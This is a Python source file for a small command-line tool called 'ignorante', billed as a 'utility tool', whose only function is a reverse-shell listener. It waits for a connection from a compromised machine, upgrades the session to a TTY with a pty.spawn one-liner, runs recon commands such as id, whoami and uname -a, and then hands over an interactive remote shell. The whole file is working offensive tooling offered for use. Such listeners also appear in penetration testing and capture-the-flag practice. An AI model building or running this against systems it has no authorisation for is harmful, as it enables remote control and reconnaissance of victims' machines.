#!/usr/bin/env python3
"""
ignorante - utility tool :)
usage: ignorante rs [port]
"""

import sys
import socket
import subprocess
import threading
import os
import time

# ─────────────────────────────────────────────
#  ansi colors
# ─────────────────────────────────────────────
R  = "\033[1;31m"
G  = "\033[1;32m"
Y  = "\033[1;33m"
B  = "\033[1;34m"
C  = "\033[1;36m"
W  = "\033[1;37m"
DIM = "\033[2m"
RST = "\033[0m"

# use raw strings or escaped backslashes to avoid SyntaxWarning
BANNER = fr"""
{R}   _                               _        {RST}
{R}  (_) __ _ _ _  ___  _ _ __ _ _ _ | |_  ___ {RST}
{Y}  | |/ _` | ' \/ _ \| '_/ _` | ' \|  _|/ -_){RST}
{Y}  |_|\__, |_||_\___/|_| \__,_|_||_|\__|\___|{RST}
{R}     |___/                                  {RST}
{DIM}                      utility tool :) // by rodrigo{RST}
"""

INFO_CMDS = [
    ("uname -a",  "kernel / arch"),
    ("id",        "current user id"),
    ("whoami",    "username"),
    ("ls -la",    "directory listing"),
]

TTY_UPGRADE_PY3 = "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
TTY_UPGRADE_PY2 = "python -c 'import pty; pty.spawn(\"/bin/bash\")'"


def clear_term():
    """clear the terminal screen."""
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    print(BANNER)


def section(title: str):
    print(f"\n{DIM}--- {title.lower()} ---{RST}")


def info(msg: str):
    print(f"{G}[+]{RST} {msg.lower()}")


def warn(msg: str):
    print(f"{Y}[!]{RST} {msg.lower()}")


def err(msg: str):
    print(f"{R}[x]{RST} {msg.lower()}")


def step(msg: str):
    print(f"{B}[>]{RST} {msg.lower()}")


# ─────────────────────────────────────────────
#  reverse shell listener
# ─────────────────────────────────────────────

def send_cmd(conn: socket.socket, cmd: str) -> str:
    """send a shell command over the socket and collect output."""
    conn.sendall((cmd + "\n").encode())
    time.sleep(0.8)
    output = b""
    conn.setblocking(False)
    try:
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            output += chunk
    except BlockingIOError:
        pass
    finally:
        conn.setblocking(True)
    return output.decode(errors="replace")


def detect_python(conn: socket.socket) -> str | None:
    """try python3 then python on the remote shell."""
    step("probing for python...")
    for binary in ("python3", "python"):
        conn.sendall(f"which {binary}\n".encode())
        time.sleep(0.5)
        conn.setblocking(False)
        out = b""
        try:
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                out += chunk
        except BlockingIOError:
            pass
        finally:
            conn.setblocking(True)
        if binary in out.decode(errors="replace"):
            info(f"found: {binary}")
            return binary
    return None


def upgrade_tty(conn: socket.socket, python_bin: str):
    """send tty upgrade command."""
    if python_bin == "python3":
        cmd = TTY_UPGRADE_PY3
    else:
        cmd = TTY_UPGRADE_PY2

    section("tty upgrade")
    step(f"sending: {cmd}")
    conn.sendall((cmd + "\n").encode())
    time.sleep(1.5)


def run_info_commands(conn: socket.socket):
    """run recon commands and print results."""
    section("machine recon")
    for cmd, label in INFO_CMDS:
        out = send_cmd(conn, cmd)
        clean = out.strip().replace("\n", " ")
        if clean:
            print(f"{B}[>]{RST} {label}: {DIM}{clean}{RST}")
        else:
            warn(f"{label}: no output received.")


def interactive_shell(conn: socket.socket):
    """drop into an interactive shell loop."""
    section("interactive shell  (type 'exit' or ctrl+c to quit)")

    def recv_loop():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            except Exception:
                break

    t = threading.Thread(target=recv_loop, daemon=True)
    t.start()

    try:
        while True:
            cmd = input()
            if cmd.strip().lower() in ("exit", "quit"):
                break
            conn.sendall((cmd + "\n").encode())
    except (KeyboardInterrupt, EOFError):
        pass

    print(f"\n{Y}[!] session closed.{RST}")


def rs_command(port: int):
    """main reverse-shell listener logic."""
    clear_term()
    print_banner()
    section(f"reverse listener // port {port}")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server.bind(("0.0.0.0", port))
    except PermissionError:
        err(f"cannot bind to port {port} (try sudo).")
        sys.exit(1)
    except OSError as e:
        err(f"bind failed: {e}")
        sys.exit(1)

    server.listen(1)
    info(f"listening on port {port} ...")
    warn("waiting for connection...")

    try:
        conn, addr = server.accept()
    except KeyboardInterrupt:
        warn("listener cancelled.")
        server.close()
        sys.exit(0)

    info(f"connection from {addr[0]}:{addr[1]}")
    time.sleep(0.4)

    # detect python
    python_bin = detect_python(conn)

    if python_bin:
        upgrade_tty(conn, python_bin)
        info("tty upgraded.")
    else:
        warn("no python found - skipping tty upgrade.")

    # recon
    run_info_commands(conn)

    # interactive
    interactive_shell(conn)

    conn.close()
    server.close()


# ─────────────────────────────────────────────
#  cli entry point
# ─────────────────────────────────────────────

def usage():
    print(f"""
{W}ignorante{RST} — utility tool :)

{Y}usage:{RST}
  ignorante rs <port>     start a reverse shell listener on <port>
""")


def main():
    if len(sys.argv) < 2:
        clear_term()
        print_banner()
        usage()
        sys.exit(0)

    cmd = sys.argv[1].lower()

    if cmd == "rs":
        if len(sys.argv) < 3:
            err("missing port. usage: ignorante rs <port>")
            sys.exit(1)
        try:
            port = int(sys.argv[2])
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            err("port must be 1-65535.")
            sys.exit(1)
        rs_command(port)

    else:
        err(f"unknown command: '{cmd}'")
        usage()
        sys.exit(1)


if __name__ == "__main__":
    main()
